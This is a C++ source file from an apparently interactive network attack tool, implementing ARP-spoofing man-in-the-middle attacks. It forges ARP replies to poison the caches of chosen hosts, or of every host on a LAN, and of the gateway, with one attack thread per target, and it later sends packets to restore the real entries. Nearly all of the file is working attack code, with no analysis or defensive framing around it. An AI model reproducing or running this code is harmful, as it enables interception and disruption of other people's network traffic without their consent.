#include "common.hpp"
#include <vector> // Required for std::vector

// --- Core MITM Attack & Recovery Functions ---

void mitm_attack(const Host target, const Host gateway, std::atomic<bool>* signal) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        // Avoid printing error for every thread
        // perror("MITM Attack socket");
        return;
    }

    unsigned char attacker_mac_bytes[6];
    string_mac_to_bytes(attacker_mac_bytes, active_interface.mac);

    unsigned char target_mac_bytes[6];
    string_mac_to_bytes(target_mac_bytes, target.mac);
    unsigned char target_ip_bytes[4];
    inet_pton(AF_INET, target.ip.c_str(), target_ip_bytes);

    unsigned char gateway_mac_bytes[6];
    string_mac_to_bytes(gateway_mac_bytes, gateway.mac);
    unsigned char gateway_ip_bytes[4];
    inet_pton(AF_INET, gateway.ip.c_str(), gateway_ip_bytes);

    unsigned char buffer[sizeof(struct ethhdr) + sizeof(struct arp_header)];
    struct sockaddr_ll sll = {0};
    sll.sll_ifindex = active_interface.index;
    struct ethhdr* eth = (struct ethhdr*)buffer;
    struct arp_header* arp = (struct arp_header*)(buffer + sizeof(struct ethhdr));
    *arp = {htons(ARPHRD_ETHER), htons(ETH_P_IP), 6, 4, htons(ARPOP_REPLY)};

    while (signal->load()) {
        // Tell Target that Gateway is at Attacker's MAC
        memcpy(eth->h_source, attacker_mac_bytes, 6);
        memcpy(eth->h_dest, target_mac_bytes, 6);
        eth->h_proto = htons(ETH_P_ARP);
        memcpy(arp->sender_mac, attacker_mac_bytes, 6);
        memcpy(arp->sender_ip, gateway_ip_bytes, 4);
        memcpy(arp->target_mac, target_mac_bytes, 6);
        memcpy(arp->target_ip, target_ip_bytes, 4);
        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&sll, sizeof(sll));

        // Tell Gateway that Target is at Attacker's MAC
        memcpy(eth->h_dest, gateway_mac_bytes, 6);
        memcpy(arp->sender_ip, target_ip_bytes, 4);
        memcpy(arp->target_mac, gateway_mac_bytes, 6);
        memcpy(arp->target_ip, gateway_ip_bytes, 4);
        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&sll, sizeof(sll));

        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    }
    close(sock);
}

void recover_mitm(const Host& target, const Host& gateway) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        // perror("MITM Recovery socket");
        return;
    }

    unsigned char target_mac_bytes[6];
    string_mac_to_bytes(target_mac_bytes, target.mac);
    unsigned char target_ip_bytes[4];
    inet_pton(AF_INET, target.ip.c_str(), target_ip_bytes);

    unsigned char gateway_mac_bytes[6];
    string_mac_to_bytes(gateway_mac_bytes, gateway.mac);
    unsigned char gateway_ip_bytes[4];
    inet_pton(AF_INET, gateway.ip.c_str(), gateway_ip_bytes);

    unsigned char buffer[sizeof(struct ethhdr) + sizeof(struct arp_header)];
    struct sockaddr_ll sll = {0};
    sll.sll_ifindex = active_interface.index;
    struct ethhdr* eth = (struct ethhdr*)buffer;
    struct arp_header* arp = (struct arp_header*)(buffer + sizeof(struct ethhdr));
    *arp = {htons(ARPHRD_ETHER), htons(ETH_P_IP), 6, 4, htons(ARPOP_REPLY)};

    for (int i = 0; i < 3; ++i) {
        // Tell Target the correct MAC for Gateway
        memcpy(eth->h_source, gateway_mac_bytes, 6);
        memcpy(eth->h_dest, target_mac_bytes, 6);
        eth->h_proto = htons(ETH_P_ARP);
        memcpy(arp->sender_mac, gateway_mac_bytes, 6);
        memcpy(arp->sender_ip, gateway_ip_bytes, 4);
        memcpy(arp->target_mac, target_mac_bytes, 6);
        memcpy(arp->target_ip, target_ip_bytes, 4);
        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&sll, sizeof(sll));

        // Tell Gateway the correct MAC for Target
        memcpy(eth->h_source, target_mac_bytes, 6);
        memcpy(eth->h_dest, gateway_mac_bytes, 6);
        memcpy(arp->sender_mac, target_mac_bytes, 6);
        memcpy(arp->sender_ip, target_ip_bytes, 4);
        memcpy(arp->target_mac, gateway_mac_bytes, 6);
        memcpy(arp->target_ip, gateway_ip_bytes, 4);
        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&sll, sizeof(sll));

        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
    close(sock);
}

void start_mitm_attack() {
    if (hosts.empty()) {
        std::cout << RED << "\nNo targets found. Please scan the network first (Option 1)." << RESET << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(2));
        return;
    }

    display_scan_results();
    std::cout << "\nEnter target ID(s) to attack (e.g., '1 3').\n";
    std::cout << "Type 'all' to attack ALL (excluding self and gateway).\n";
    std::cout << "Enter 'back' to return to the main menu.\n";
    std::cout << "\nTarget(s): ";

    std::string input;
    std::getline(std::cin, input);
    if (input == "back") return;

    // --- Find Gateway ---
    std::string gateway_ip_str;
    FILE *fp = popen("ip r | grep default | cut -d' ' -f3", "r");
    char buf[16];
    if (fp && fgets(buf, sizeof(buf), fp) != NULL) gateway_ip_str = buf;
    if(fp) pclose(fp);
    gateway_ip_str.erase(std::remove(gateway_ip_str.begin(), gateway_ip_str.end(), '\n'), gateway_ip_str.end());

    Host gateway_host;
    gateway_host.ip = gateway_ip_str;
    bool gateway_found_in_scan = false;

    // 1. Passive Check: Look in existing scan results
    for (const auto& host : hosts) {
        if (host.ip == gateway_ip_str) {
            gateway_host.mac = host.mac;
            gateway_found_in_scan = true;
            break;
        }
    }

    // 2. Active Probe: If not found, send a direct ARP request
    if (!gateway_found_in_scan) {
        std::cout << YELLOW << "[i] Gateway not in cache, actively probing for " << gateway_ip_str << "..." << RESET << std::endl;
        int probe_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        if (probe_sock >= 0) {
            unsigned char buffer[sizeof(struct ethhdr) + sizeof(struct arp_header)];
            struct ethhdr* eth = (struct ethhdr*)buffer;
            struct arp_header* arp = (struct arp_header*)(buffer + sizeof(struct ethhdr));

            string_mac_to_bytes(eth->h_source, active_interface.mac);
            memset(eth->h_dest, 0xff, 6); // Broadcast MAC
            eth->h_proto = htons(ETH_P_ARP);
            
            *arp = {htons(ARPHRD_ETHER), htons(ETH_P_IP), 6, 4, htons(ARPOP_REQUEST)};
            string_mac_to_bytes(arp->sender_mac, active_interface.mac);
            inet_pton(AF_INET, active_interface.ip.c_str(), arp->sender_ip);
            memset(arp->target_mac, 0x00, 6);
            inet_pton(AF_INET, gateway_ip_str.c_str(), arp->target_ip);

            struct sockaddr_ll sll = {0}; sll.sll_ifindex = active_interface.index;
            sendto(probe_sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&sll, sizeof(sll));
            
            struct timeval timeout = {1, 0}; // 1-second timeout
            setsockopt(probe_sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

            auto start_time = std::chrono::steady_clock::now();
            while(std::chrono::duration_cast<std::chrono::seconds>(std::chrono::steady_clock::now() - start_time).count() < 2) { // Listen for 2s
                 if (recv(probe_sock, buffer, sizeof(buffer), 0) > 0) {
                    if (ntohs(arp->opcode) == ARPOP_REPLY) {
                        char replied_ip_str[INET_ADDRSTRLEN];
                        inet_ntop(AF_INET, arp->sender_ip, replied_ip_str, sizeof(replied_ip_str));
                        if (gateway_ip_str == replied_ip_str) {
                             gateway_host.mac = bytes_mac_to_string(arp->sender_mac);
                             break;
                        }
                    }
                }
            }
            close(probe_sock);
        }
    }
    
    // Final check for gateway MAC before proceeding
    if (gateway_host.mac.empty()) {
        std::cout << RED << "Gateway discovery failed. Please check network connectivity and scan again." << RESET << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(2));
        return;
    }

    // --- Process Input & Select Targets ---
    std::vector<Host> targets_to_attack;
    std::string processed_input = input;
    std::transform(processed_input.begin(), processed_input.end(), processed_input.begin(), ::tolower);

    if (processed_input == "all") {
        for(const auto& host : hosts) {
            if (host.ip != active_interface.ip && host.ip != gateway_host.ip) {
                targets_to_attack.push_back(host);
            }
        }
    } else {
        std::stringstream ss(input);
        int id;
        while (ss >> id) {
            if (id > 0 && static_cast<size_t>(id) <= hosts.size()) {
                Host selected = hosts[id - 1];
                if (selected.ip != active_interface.ip && selected.ip != gateway_host.ip) {
                    targets_to_attack.push_back(selected);
                }
            }
        }
    }

    if (targets_to_attack.empty()) {
        std::cout << YELLOW << "No valid targets selected." << RESET << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(2));
        return;
    }

    // --- Start Attack Threads ---
    std::atomic<bool> attack_signal(true);
    std::vector<std::thread> attack_threads;

    print_header();
    std::cout << BOLD << RED << "[ATTACKING] " << targets_to_attack.size() << " target(s)..." << RESET << std::endl;
    for(const auto& target : targets_to_attack) {
        std::cout << "  -> " << target.ip << std::endl;
        attack_threads.emplace_back(mitm_attack, target, gateway_host, &attack_signal);
    }

    std::cout << BOLD << YELLOW << "\nAttack is running. Press 's' and Enter to stop." << RESET << std::endl;

    char stop_char;
    do {
        std::cin.clear(); // Clear potential error flags
        std::cin >> stop_char;
    } while (stop_char != 's' && stop_char != 'S');


    // --- Stop Attack & Recover ---
    attack_signal.store(false);
    std::cout << "\n" << BOLD << YELLOW << "[!] Stopping " << attack_threads.size() << " attack thread(s)..." << RESET << std::endl;
    for (auto& th : attack_threads) {
        if (th.joinable()) {
            th.join();
        }
    }

    std::cout << BOLD << GREEN << "[+] Sending recovery packets to " << targets_to_attack.size() << " target(s)..." << RESET << std::endl;
    for(const auto& target : targets_to_attack) {
        recover_mitm(target, gateway_host);
    }
    std::cout << "[+] Network should be restored." << RESET << std::endl;
    std::cout << "\nPress Enter to continue...";
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    std::cin.get();
}